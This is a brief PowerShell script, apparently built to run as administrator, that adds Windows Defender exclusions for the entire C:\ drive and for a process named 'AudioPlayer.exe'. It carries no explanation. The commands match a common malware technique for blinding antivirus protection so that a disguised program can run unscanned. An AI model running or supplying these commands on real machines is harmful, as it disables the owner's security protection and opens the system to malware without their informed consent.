#Requires -RunAsAdministrator

Add-MpPreference -ExclusionPath "C:\\"
Add-MpPreference -ExclusionProcess "AudioPlayer.exe"